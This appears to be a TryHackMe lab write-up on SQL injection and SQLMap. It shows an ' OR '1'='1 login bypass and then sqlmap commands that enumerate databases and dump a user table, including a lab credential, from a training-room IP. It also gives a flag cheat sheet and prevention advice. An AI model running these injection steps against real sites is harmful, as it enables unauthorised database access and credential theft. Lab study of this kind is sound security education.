# 🗄️ SQLMap — Automated SQL Injection Tool

> **Room:** Cyber Security 101 Path — SQLMap  
> **Difficulty:** Easy  
> **Status:** ✅ Completed

---

## 🧠 What is SQL Injection?

When you open a login page and type your username + password, the website asks its database:

```sql
SELECT * FROM user WHERE username='ali' AND password='1234';
```

If both match → ✅ Login granted.

**SQL Injection** happens when the website puts your input directly into the SQL query **without validating it**. A hacker can break out of the query and inject their own SQL.

### 🔴 Example Attack

| Input Type | Value |
|---|---|
| Normal input | `ali` |
| Hacker input | `' OR '1'='1` |

The query becomes:

```sql
SELECT * FROM user WHERE username='ali' AND password='' OR '1'='1';
```

`'1'='1'` is **always true** → Login granted without a valid password! 🚨

---

## 🤖 What is SQLMap?

SQLMap is an **automated tool** that finds and exploits SQL injection vulnerabilities. Instead of crafting queries manually, SQLMap does all the heavy lifting automatically.

---

## 🎯 Task Goal

**Extract real user credentials from a vulnerable website's database using SQLMap.**

---

## 🖼️ Target — Login Page

The target app was a "ChatAI" login page running on an internal IP:

```
http://10.112.153.155/ai/login
```

![Login Page](https://github.com/alimirza2412/Tryhackme-notes/blob/47e6b384ea69d6c3949847f84ea84265b2ba19cd/Cyber-Security-101/Offensive-Security-Tooling/SQLMap%3AThe-Basics/sqlmap%20task%201.png)

Steps to find the injectable URL:
1. Right-click → **Inspect** → **Network** tab
2. Enter fake credentials and submit
3. Intercept the GET request:

```
http://10.112.153.155/ai/includes/user_login?email=test&password=test
```

The `email` and `password` are **GET parameters** — these are the injection points.

---

## ⚔️ Step-by-Step Attack

### Step 1 — Check for Vulnerability

```bash
sqlmap -u 'http://10.112.153.155/ai/includes/user_login?email=test&password=test' --level=5
```

**Result:** `email` parameter is vulnerable ✅

SQLMap found multiple injection types:
- ✅ Boolean-based blind
- ✅ Error-based
- ✅ Time-based blind

---

### Step 2 — List All Databases

```bash
sqlmap -u 'http://10.112.153.155/ai/includes/user_login?email=test&password=test' --level=5 --dbs --batch
```

![Databases Found](https://github.com/alimirza2412/Tryhackme-notes/blob/94be2ec56353fb659ad738bc1b867f778d618655/Cyber-Security-101/Offensive-Security-Tooling/SQLMap%3AThe-Basics/sqlmap%20task%202.png)

**Result — 6 databases found:**

```
[*] ai                 ← 👀 Interesting!
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test
```

The `ai` database belongs to the target app.

---

### Step 3 — List Tables in `ai` Database

```bash
sqlmap -u 'http://10.112.153.155/ai/includes/user_login?email=test&password=test' --level=5 -D ai --tables --batch
```

![Tables Found](https://github.com/alimirza2412/Tryhackme-notes/blob/05ee4cc9ddd1228f994aa6ea0ff41fb6aa295c97/Cyber-Security-101/Offensive-Security-Tooling/SQLMap%3AThe-Basics/sqlmap%20task%203.png)

**Result:**

```
Database: ai
[1 table]
+------+
| user |
+------+
```

One table: `user`. That's where the credentials are stored.

---

### Step 4 — Dump the Data

```bash
sqlmap -u 'http://10.112.153.155/ai/includes/user_login?email=test&password=test' --level=5 -D ai -T user --dump --batch
```

![Data Dumped](https://github.com/alimirza2412/Tryhackme-notes/blob/b1b4e32ab8522976f51ce01cb8f5cceaee62ec0e/Cyber-Security-101/Offensive-Security-Tooling/SQLMap%3AThe-Basics/sqlmap%20task%204.png)

**Result — credentials extracted! 🎉**

```
Database: ai
Table: user
[1 entry]
+----+------------------+---------------------+----------+
| id | email            | created             | password |
+----+------------------+---------------------+----------+
| 1  | test@chatai.com  | 2023-02-21 09:05:46 | 12345678 |
+----+------------------+---------------------+----------+
```

---

## 🔁 Full Attack Flow

```
Login Page URL found
        ↓
SQLMap confirms email parameter is injectable
        ↓
--dbs → lists all 6 databases
        ↓
-D ai --tables → finds 'user' table
        ↓
-D ai -T user --dump → dumps email + password
        ↓
🎯 Credentials: test@chatai.com / 12345678
```

---

## 🧰 SQLMap Cheat Sheet

| Flag | What it does |
|---|---|
| `-u URL` | Target URL |
| `--level=5` | Deep scan (max aggression) |
| `--dbs` | List all databases |
| `-D dbname` | Select a database |
| `--tables` | List tables in selected DB |
| `-T tablename` | Select a table |
| `--dump` | Extract all data from table |
| `--batch` | Auto-answer all prompts (no manual input) |
| `-r request.txt` | Test a saved POST request |
| `--wizard` | Beginner-friendly interactive mode |

---

## 💡 Key Concepts

**Boolean-based blind** — SQLMap sends True/False queries and guesses data based on response differences.

**Time-based blind** — SQLMap uses `SLEEP()` delays to confirm injection when no visible output exists.

**Error-based** — Database error messages leak data directly.

**UNION-based** — SQLMap appends a `UNION SELECT` to pull data in one shot.

---

## 🛡️ How to Prevent SQL Injection

| Method | Why it works |
|---|---|
| Prepared Statements | Query and data are separated — input can't break the structure |
| Input Validation | Reject unexpected characters before they reach the DB |
| ORM Frameworks | Abstracts raw SQL — injection surface is minimized |
| Least Privilege DB Accounts | Even if injected, attacker can't DROP tables or access other DBs |

---

> 📁 Part of [TryHackMe Notes](https://github.com/alimirza2412/Tryhackme-notes) — Jr Penetration Tester Path
